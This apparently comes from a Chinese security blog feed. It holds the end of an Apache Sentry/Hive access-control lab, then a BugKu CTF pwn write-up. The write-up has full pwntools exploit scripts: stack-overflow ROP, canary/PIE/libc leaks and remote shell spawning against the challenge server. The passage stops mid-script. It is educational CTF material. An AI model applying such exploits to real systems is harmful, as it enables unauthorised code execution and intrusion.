<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165225.png"></p>
<p>之后点击<code>Save Changes</code>，并回到主界面，点击左侧新出现的红色扳手；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165454.png"></p>
<p>弹出窗口后点击<code>Enable Stored Notifications in Database</code>，勾选相关选项并点击<code>Save Changes</code>保存配置，然后点击右侧的蓝色文件图标提交修改的配置文件并重新启动所有相关服务；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165625.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203165656.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203170352.png"></p>
<p>重启后进入主界面，重启虚拟机，并再次运行桌面上的cloudera express，进入浏览器等待程序运行完毕，登录cloudera manager，点击左侧栏的蓝文件图标更新配置文件并重启到如下状态开始相关实验；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203190339.png"></p>
</li>
</ol>
<h2 id="实验数据库搭建"><a href="#实验数据库搭建" class="headerlink" title="实验数据库搭建"></a>实验数据库搭建</h2><ol>
<li><p>打开终端，输入<code>beeline</code>打开beeline命令行终端。进入beeline后输入<code>!connect jdbc:hive2://localhost:10000</code>链接数据库，用户名为<code>hive</code>，密码为空；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203192725.png"></p>
</li>
<li><p>输入命令<code>create role admin_role;</code>创建管理员角色；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195259.png"></p>
<p>通过命令<code>grant all on server server1 to role admin_role;</code>赋予其对server1(系统中的服务器名称)服务器的所有操作权限；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195448.png"></p>
<p>通过<code>grant role admin_role to group hive;</code>命令将admin_role拥有的权限添加到hive组中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203195639.png"></p>
</li>
<li><p>关闭当前终端，再次使用hive登录系统执行如下操作：</p>
<ol>
<li><p>输入<code>create database school;</code> 创建school数据库；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200133.png"></p>
</li>
<li><p>输入<code>use school;</code>切换到school数据库；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200216.png"></p>
</li>
<li><p>输入<code>create table gradebook(id string, first string, last string, grade int) row format delimited fields terminated by &#39;,&#39;;</code> ‘创建gradebook表，该表包含id、first、last和grade列；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200410.png"></p>
</li>
<li><p>输入<code>insert into gradebook values(&#39;10001&#39;,&#39;san&#39;,&#39;zhang&#39;,80),(&#39;10002&#39;,&#39;si&#39;,&#39;li&#39;,90);</code>插入两条数据，该过程较慢，需等待片刻；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200726.png"></p>
</li>
<li><p>输入<code>select * from gradebook;</code>确定数据有正确插入到数据库中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203200900.png"></p>
</li>
</ol>
</li>
</ol>
<h2 id="权限分配"><a href="#权限分配" class="headerlink" title="权限分配"></a>权限分配</h2><ol>
<li><p>打开新的终端，输入<code>sudo useradd student</code>、<code>sudo useradd grader</code>，分别创建一个student用户和grader用户，并通过<code>sudo passwd student</code>、<code>sudo passwd student</code>设置密码；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202141.png"></p>
</li>
<li><p>回到beeline终端，输入<code>create role student_role;</code>创建新角色；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202350.png"></p>
</li>
<li><p>输入<code>grant select (id,first,last)on table gradebook to role student_role;</code>使student_role只能读取gradebook表的id、first、last列；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202604.png"></p>
</li>
<li><p>输入<code>create role grader_role;</code>创建新角色；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202704.png"></p>
</li>
<li><p>输入<code>grant insert on table gradebook to role grader_role;</code>使得grader_role只能插入数据到gradebook表中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202759.png"></p>
</li>
<li><p>输入<code>grant role student_role to group student;</code>将student_role的权力赋予给student组；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203029.png"></p>
</li>
<li><p>输入<code>grant role grader_role to group grader;</code>将grader_role的权力赋予给grader组；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203202912.png"></p>
</li>
</ol>
<h2 id="权限测试"><a href="#权限测试" class="headerlink" title="权限测试"></a>权限测试</h2><ol>
<li><p>重新打开一个终端并启动beeline，输入<code>!connect jdbc:hive2://localhost:10000</code>后回车，用户名为grader，密码为空登录该用户；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203412.png"></p>
</li>
<li><p>输入<code>use school;</code>选择school数据库；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203449.png"></p>
</li>
<li><p>输入<code>select * from gradebook;</code>，确认grader没有权力查看该表；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203203619.png"></p>
</li>
<li><p>输入<code>insert into gradebook values(&#39;10003&#39;,&#39;wu&#39;,&#39;wang&#39;,100);</code>将数据插入到表中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203213514.png"></p>
</li>
<li><p>由于grader无权查看数据，新建终端启动beeline，以hive的身份进入数据库，输入<code>use school;</code>切换数据库并输入<code>select * from gradebook;</code>，根据下图显示，确认grader的数据正确插入到数据库中；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203213947.png"></p>
</li>
<li><p>退出该终端，启动新终端进入beeline，以student的身份登录系统。输入<code>use school;</code>切换数据库并输入<code>select * from gradebook;</code>发现student是否可以查看gradebook的全部数据；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203234137.png"></p>
<p>输入<code>select id,first,last from gradebook;</code>确认student可以查看已授予查看权限的id、first、last列；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191203234617.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>大数据安全实验</category>
      </categories>
      <tags>
        <tag>Apache Sentry</tag>
        <tag>cloudera quickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>BugKu-PWN-WP</title>
    <url>/BugKu-PWN-WP.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理BugKuCTF中PWN题WriteUp；<span id="more"></span></p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>一道与pwn无关的pwn题！</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104144001.png" style="zoom:30%;">

<p>首先nc连接到服务器；根据题目描述，输入ls命令查看，发现flag文件；打开flag文件，内容即为flag；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104144252.png" style="zoom:50%;">

<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>栈溢出ROP执行已有指令！</p>
<ol start="2">
<li><p>在ubuntu18.04下执行如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104164352.png" style="zoom:50%;"></li>
<li><p>checksec查看，发现无保护措施；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104164527.png" style="zoom:50%;"></li>
<li><p>在IDA中分析，main()伪代码如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104165554.png" style="zoom:50%;">

<p> 分析有一个输入、两个输出，没有flag相关信息；</p>
<hr>
<p> 其中：</p>
<p> memset()函数被称为初始化内存的“万能函数”，通常为新申请的内存进行初始化工作。它是直接操作内存空间，mem即“内存”（memory）的意思。该函数的原型为：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memset</span><span class="params">(<span class="type">void</span> *s, <span class="type">int</span> c, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure>

<p> 函数的功能是：将指针变量s所指向的前n字节的内存单元用一个“整数”c替换，注意c是int型。s是void*型的指针变量，所以它可以为任何类型的数据进行初始化。</p>
<p> memset()的作用是<strong>在一段内存块中填充某个给定的值</strong>。因为它只能填充一个值，所以该函数的初始化为原始初始化，无法将变量初始化为程序中需要的数据。用memset()函数初始化完后，后面程序中再向该内存空间中存放需要的数据。</p>
<hr>
<p> 此处memset()函数初始化变量s，长度为<code>30h</code>字节，用于后续通过read()函数将输入内容赋值给s，但是read()函数最多可以读取<code>100h</code>字节赋值给s，可能造成栈溢出；</p>
</li>
<li><p>在函数列表发现get_shell_()函数，查看伪代码；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104165844.png" style="zoom:50%;">

<p> 发现有<code>cat flag</code>操作，要得到flag，就需要执行get_shell_()函数；</p>
</li>
<li><p> 利用read()函数进行栈溢出ROP执行get_shell_()函数，只需覆盖s和RBP指针，写入get_shell_()函数地址即可执行；</p>
</li>
<li><p>在IDA中获取get_shell_()函数的内存地址为 <code>0x400751</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104171317.png" style="zoom:50%;"></li>
<li><p>构造<code>payload='a'*0x30+'a'*0x8+p64(0x400751)</code>，具体<code>payload.py</code>如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">get_shell_ = p64(<span class="number">0x400751</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)+get_shell_</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，发现可以执行<code>cat flag</code>，但是本地文件中并无flag，需要远程执行；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104173659.png" style="zoom:50%;"></li>
<li><p>重新构造payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">p = remote(<span class="string">'114.67.246.176'</span>,<span class="string">'15094'</span>)</span><br><span class="line">get_shell_ = p64(<span class="number">0x400751</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x30</span>+<span class="number">0x8</span>)+get_shell_</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，拿到flag如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104175545.png" style="zoom:50%;"></li>
</ol>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>护盾全开的栈溢出！</p>
<ol start="2">
<li><p>checksec查看，保护全开；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210104184621.png" style="zoom:50%;"></li>
<li><p>在IDA中分析，核心函数<code>vul()</code>函数如下；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311202328.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li> <code>vul()</code>函数，发现两个<code>read()</code>函数，即存在两个溢出点；第一个<code>read()</code>用于栈溢出，并且溢出长度自定义。在第一个<code>read()</code>栈溢出后，if检测到过长，第二次<code>read()</code>时，只需字符串长度小于<code>624</code>即可；</li>
<li> 由于保护全开，因此需要多次溢出获取canary和基址；</li>
<li> 每次溢出原理基本相同：程序每执行一次<code>vul()</code>函数会有两次<code>read()</code>操作，第一次<code>read()</code>后紧跟<code>puts()</code>，<code>puts()</code>是通过<code>\x00</code>截断输出字符串，因此只需要第一次<code>read()</code>覆盖<code>\x00</code>然后用<code>puts()</code>溢出一个值，接着在第二个read中修改ret地址劫持流程跳转回<code>main()</code>函数用于恢复栈即可，通过多次调用vul函数来泄漏所有需要的值；</li>
</ol>
</li>
<li><p>步骤</p>
<ol>
<li><p>泄漏canary</p>
<ol>
<li><p> canary在rbp上面即<code>var_8</code>，根据<strong>canary最低位为<code>\x00</code>的特点</strong>，将其最低位覆盖，在之后<code>puts</code>打印出canary；</p>
</li>
<li><p>第二次输入绕过canary保护，PIE保护会导致程序的地址随机化，但是后三位是不会变的，例如第二次输入完后程序的返回地址<code>main+e</code>的后三位就是<code>0xd2e</code>，利用输入用<code>20</code>覆盖<code>2e</code>，程序就会再次运行main函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311203647.png" style="zoom:50%;">

</li>
<li><p>泄漏canary的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">600</span>)</span><br><span class="line">p.recvuntil(<span class="string">'aaa\n'</span>)</span><br><span class="line">canary_addr=u64(<span class="string">"\x00"</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary:'</span>+<span class="built_in">hex</span>(canary_addr))</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">return_main = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + <span class="string">'\x20'</span></span><br><span class="line">p.send(return_main)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>泄漏基址</p>
<ol>
<li><p><code>main()</code>函数通过<code>call</code>指令调用<code>vul()</code>函数，而<code>call</code>指令会将下一条指令的地址压栈，<code>vul()</code>函数执行完毕后，<code>ret</code>指令会将RIP指向<code>call</code>指令的后一条指令的地址，因此<code>vul()</code>函数的<code>ret</code>值相对于程序基址的偏移是<code>0xD2E</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311235403.png" style="zoom:50%;">

 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311235449.png" style="zoom:50%;"></li>
<li><p>泄漏基址的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak base_elf</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*(<span class="number">600</span>+<span class="number">8</span>+<span class="number">7</span>))</span><br><span class="line">p.recvuntil(<span class="string">'aaa\n'</span>)</span><br><span class="line">base_elf = u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>) - <span class="number">0xD2E</span></span><br><span class="line">log.success(<span class="string">'elf:'</span>+<span class="built_in">hex</span>(base_elf))</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">p.send(return_main)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>泄漏libc基址</p>
<ol>
<li><p> 借助base_elf调用<code>read()</code>函数输出<code>read()</code>函数的真实地址，由于<code>read</code>函数是libc函数，减去其偏移即可得到libc基址，偏移地址为<code>0x0F7250</code>；</p>
</li>
<li><p>泄漏libc基址的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">libc=ELF(<span class="string">'./read_note'</span>)</span><br><span class="line">puts_plt = libc.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = libc.got[<span class="string">'read'</span>]</span><br><span class="line">pop_rdi = <span class="number">0xE03</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">main_addr = base_elf + <span class="number">0xD20</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi+base_elf) + p64(read_got+base_elf) + p64(puts_plt+base_elf) + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">")\n"</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi+base_elf)</span><br><span class="line">p.send(payload2)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">libc_addr = read_addr-<span class="number">0x0F7250</span></span><br><span class="line">log.success(<span class="string">'libc:'</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>getShell</p>
<ol>
<li><p> 修改返回地址为<code>/bin/sh</code>的地址，即可getshell，其中<code>/bin/sh</code>相对于libc基址的偏移地址设为<code>0xF1147</code>，此处涉及到one_gadget工具；</p>
</li>
<li><p>getShell的payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">600</span>)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_addr+<span class="number">0xF1147</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>最终payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"114.67.246.176"</span>, <span class="number">15482</span>)</span><br><span class="line"><span class="comment">#p = process('./read_note')</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">'./read_note'</span>)</span><br><span class="line">puts_plt = libc.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = libc.got[<span class="string">'read'</span>]</span><br><span class="line">pop_rdi = <span class="number">0xE03</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">600</span>)</span><br><span class="line">p.recvuntil(<span class="string">'aaa\n'</span>)</span><br><span class="line">canary_addr=u64(<span class="string">"\x00"</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary:'</span>+<span class="built_in">hex</span>(canary_addr))</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">return_main = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + <span class="string">'\x20'</span></span><br><span class="line">p.send(return_main)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak base_elf</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*(<span class="number">600</span>+<span class="number">8</span>+<span class="number">7</span>))</span><br><span class="line">p.recvuntil(<span class="string">'aaa\n'</span>)</span><br><span class="line">base_elf = u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>) - <span class="number">0xD2E</span></span><br><span class="line">log.success(<span class="string">'elf:'</span>+<span class="built_in">hex</span>(base_elf))</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">p.send(return_main)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">main_addr = base_elf + <span class="number">0xD20</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi+base_elf) + p64(read_got+base_elf) + p64(puts_plt+base_elf) + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">")\n"</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi+base_elf)</span><br><span class="line">p.send(payload2)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">libc_addr = read_addr-<span class="number">0x0F7250</span></span><br><span class="line">log.success(<span class="string">'libc:'</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">p.recvuntil(<span class="string">"path:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"len:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"note:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">600</span>)</span><br><span class="line">p.recvuntil(<span class="string">"(len is 624)\n"</span>)</span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">600</span> + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(libc_addr+<span class="number">0xF1147</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>执行payload，成功getshell；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210312005405.png" style="zoom:50%;"></li>
</ol>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><ol>
<li><p>checksec查看，开启了canary和NX保护；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210312092957.png" style="zoom:50%;"></li>
<li><p>放入IDA中分析；</p>
<ol>
<li><p><code>main()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210312093117.png" style="zoom:50%;"></li>
<li><p><code>hint()</code>函数</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210312093141.png" style="zoom:50%;"></li>
<li><p>分析</p>
<ol>
<li> <code>main()</code>函数两次<code>read</code>操作读取的空间大于写入的空间，可以泄漏内存；</li>
<li> 由于开启了canary保护，要泄漏canary；</li>
<li> <code>hint()</code>函数中存在<code>system</code>调用，可以利用其执行<code>system('/bin/sh')</code>；</li>
</ol>
</li>
</ol>
</li>
<li><p>步骤</p>
<ol>
<li><p>泄漏canary</p>
<ol>
<li><p> canary在rbp上面即<code>var_8</code>，根据<strong>canary最低位为<code>\x00</code>的特点</strong>，将其最低位覆盖，在之后<code>puts</code>打印出canary；</p>
</li>
<li><p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">"Please leave your name(Within 36 Length):"</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*(<span class="number">0x240</span>-<span class="number">0x08</span>)+<span class="string">'b'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*(<span class="number">0x241</span>-<span class="number">0x08</span>)+<span class="string">'b'</span>)</span><br><span class="line">canary_addr=u64(<span class="string">"\x00"</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary:'</span>+<span class="built_in">hex</span>(canary_addr))</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>getshell</p>
<ol>
<li><p>获取system的plt，binsh的got，以及<code>pop rdi;ret</code>位置：<code>ROPgadget --binary ./pwn4 | grep "pop rdi ; ret"</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210313162256.png" style="zoom:50%;"></li>
<li><p> 利用第二个<code>read</code>覆盖返回地址，跳转到执行<code>system(/bin/sh)</code>；</p>
</li>
<li><p>payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">'system_plt:'</span>+<span class="built_in">hex</span>(system_plt))</span><br><span class="line">binsh_got = elf.search(<span class="string">"/bin/sh\x00"</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">'binsh_got:'</span>+<span class="built_in">hex</span>(binsh_got))</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please leave a message(Within 0x200 Length):"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x210</span>-<span class="number">8</span>) + p64(canary_addr) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(binsh_got) + p64(system_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>最终payload如下；</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'114.67.246.176'</span>,<span class="number">13645</span>)</span><br><span class="line"><span class="comment"># p = process('./pwn4')</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">"Please leave your name(Within 36 Length):"</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*(<span class="number">0x241</span>-<span class="number">0x08</span>))</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*(<span class="number">0x241</span>-<span class="number">0x08</span>))</span><br><span class="line">canary_addr=u64(<span class="string">"\x00"</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">'canary:'</span>+<span class="built_in">hex</span>(canary_addr))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">'system_plt:'</span>+<span class="built_in">hex</span>(system_plt))</span><br><span class="line">binsh_got = elf.search(<span class="string">"/bin/sh\x00"</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">'binsh_got:'</span>+<span class="built_in">hex</span>(binsh_got))</span><br><span class="line">pop_rdi_ret = <span 